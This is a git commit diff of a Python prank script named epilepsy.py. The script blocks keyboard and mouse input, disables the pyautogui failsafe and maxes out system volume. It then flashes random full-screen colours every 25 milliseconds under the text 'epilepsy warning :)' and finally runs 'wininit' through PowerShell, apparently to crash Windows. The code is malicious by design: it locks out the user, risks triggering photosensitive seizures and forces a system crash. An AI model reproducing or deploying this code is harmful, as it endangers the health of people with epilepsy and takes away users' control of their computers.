e9cd841dfc841af85b1e59847f3484ec3c0bdc0a
FriedCircuits177 <23isaac.tan.en.hsien@acsians.acsi.edu.sg>
2024-08-19 16:50:30 +0800

    Replaced epilepsy with epilepsy-pg

--- epilepsy.py
+++ epilepsy.py
@@ -1,39 +1,66 @@
-import time
-from turtle import Screen
-import random as r
-import ctypes
-from ctypes import wintypes
+import pygame
 import playsound
+import random
+import ctypes
+from ctypes import wintypes, cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from time import sleep
+import subprocess
+import sys
+import pyautogui
 import threading
-light="ABCDEF"
-dark="012345"
-color="#"
+#ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+pygame.init()
 
-wn=Screen()
-screen = Screen()
-screenTk = screen.getcanvas().winfo_toplevel()
-rootwindow = wn.getcanvas().winfo_toplevel()
-rootwindow.call('wm', 'attributes', '.', '-topmost', '1')
-rootwindow.call('wm', 'attributes', '.', '-topmost', '0')
-screenTk.attributes("-fullscreen", True)
+MUSIC = "salinewin.wav"
+screen = pygame.display.set_mode((1920,1200))
+pygame.display.toggle_fullscreen()
+pygame.mixer_music.load(MUSIC)
+
+font = pygame.font.Font("zhcn.ttf",140)
 BlockInput = ctypes.windll.user32.BlockInput
 BlockInput.argtypes = [wintypes.BOOL]
 BlockInput.restype = wintypes.BOOL
 BlockInput(True)
+pyautogui.FAILSAFE= False
 
-def ps(filepath="salinewin.wav"):
-    playsound.playsound(filepath)
- 
-playsound.playsound("salinewin.wav",block=True)
-time.sleep(1)
+screen.fill((0,0,0))
+txt = font.render("epilepsy warning :)",True,(50,50,50))
+textRect = txt.get_rect()
+
+textRect.center = (1920 // 2, 1200 // 2)
+screen.blit(txt,textRect)
+pygame.display.update()     
+sleep(1)
+
+devices = AudioUtilities.GetSpeakers()
+interface = devices.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None)
+volume = cast(interface,POINTER(IAudioEndpointVolume))
+volume.SetMasterVolumeLevel(0.0,None)
+pygame.mixer_music.play()
+
+
+
 while True:
-    for y in range(6):
-        color+=light[r.randint(0,5)]
-    screen.bgcolor(color)
-    time.sleep(0.05)
-    color="#"
-    for z in range(6):
-        color+=dark[r.randint(0,5)]
-    screen.bgcolor(color)
-    time.sleep(0.05)
-    color="#"
+    
+    if pygame.mixer_music.get_busy() == False:
+        subprocess.call(["powershell","-Command","wininit"])
+        break
+    events = pygame.event.get()
+    for e in events:
+        if e == pygame.QUIT:
+
+            break
+    screen.fill((random.randint(0,255),random.randint(0,255),random.randint(0,255)))
+    txt = font.render("epilepsy warning :)",True,(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
+    textRect = txt.get_rect()
+
+ 
+    textRect.center = (random.randint(750,1170),random.randint(390,810))
+    screen.blit(txt,textRect)
+    pygame.display.update()
+    sleep(0.025)
+
+
+pygame.quit()
